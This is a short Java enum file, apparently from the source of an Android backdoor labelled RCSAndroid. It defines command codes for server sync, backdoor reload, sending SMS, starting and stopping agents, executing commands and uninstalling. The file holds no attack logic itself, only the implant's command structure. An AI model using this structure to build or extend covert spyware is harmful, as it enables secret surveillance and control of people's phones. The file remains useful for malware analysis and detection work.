/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : SubActionType.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import java.util.Hashtable;



public enum SubActionType {

	/** The Constant ACTION_SYNC. */
	ACTION_SYNC(0x4001), // Sync su server

	/** The Constant ACTION_UNINSTALL. */
	ACTION_UNINSTALL(0x4002), // Uninstall

	/** The Constant ACTION_RELOAD. */
	ACTION_RELOAD(0x4003), // Reload della backdoor

	/** The Constant ACTION_SMS. */
	ACTION_SMS(0x4004), // Invia un SMS

	/** The Constant ACTION_TOOTHING. */
	//ACTION_TOOTHING(0x4005), // Non utilizzata

	/** The Constant ACTION_START_AGENT. */
	ACTION_START_AGENT(0x4006), // Avvia un agente

	/** The Constant ACTION_STOP_AGENT. */
	ACTION_STOP_AGENT(0x4007), // Ferma un agente

	/** The Constant ACTION_SYNC_PDA. */
	ACTION_SYNC_PDA(0x4008), // Sync su Mediation Node

	/** The Constant ACTION_EXECUTE. */
	ACTION_EXECUTE(0x4009), // Esegui un comando

	/** The Constant ACTION_SYNC_APN. */
	ACTION_SYNC_APN(0x400a), // Sync su APN

	/** The Constant ACTION_LOG. */
	ACTION_LOG(0x400b); // Crea un LOG_INFO
	
	private int value;

	private SubActionType(int value) {
		this.value = value;
		Types.map.put(value, this);
	}

	/**
	 * Get the subaction indexed by value
	 * @param value
	 * @return the subaction or null if not available
	 */
	public static SubActionType get(int value) {
		return Types.map.get(value);
	}

	/**
	 * Value.
	 * 
	 * @return the int
	 */
	public int value() {
		return value;
	}

	/**
	 * map of aliases to enum constants
	 */
	private static final class Types {
		public static int BASE = 0x4000;
		/**
		 * map from name no enum constant
		 */
		static final Hashtable<Integer, SubActionType> map = new Hashtable<Integer, SubActionType>();
	}
}
